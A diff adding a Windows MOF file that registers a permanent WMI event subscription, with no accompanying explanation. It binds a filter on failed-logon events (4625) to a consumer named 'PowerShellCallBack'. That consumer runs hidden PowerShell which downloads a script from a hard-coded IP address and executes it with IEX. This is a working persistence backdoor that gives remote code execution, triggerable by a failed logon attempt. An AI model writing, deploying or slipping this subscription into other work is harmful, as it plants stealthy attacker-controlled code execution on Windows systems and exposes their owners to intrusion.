@@ -1,0 +1,25 @@
+#pragma namespace ("\\\\.\\root\\subscription")
+
+instance of __EventFilter as $filter
+{
+  Name = "User";
+  EventNamespace = "root\\cimv2";
+  Query = "SELECT * FROM __InstanceCreationEvent Within 5"
+  "Where TargetInstance Isa \"Win32_NTLogEvent\" "
+  "And TargetInstance.EventCode = \"4625\" "
+  "And TargetInstance.Message Like \"%information%\" ";
+  QueryLanguage = "WQL";
+};
+
+instance of CommandLineEventConsumer as $consumer
+{
+  Name = "PowerShellCallBack";
+  RunInteractively = false;
+  CommandLineTemplate = "powershell.exe -nop -w hidden -c $q=New-Object Net.WebClient;$q.proxy = [Net.WebRequest]::GetSystemWebProxy();$q.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;IEX $q.DownLoadString('https://192.168.123.103:443/');";
+};
+
+instance of __FilterToConsumerBinding
+{
+  Filter = $filter;
+  Consumer = $consumer
+}
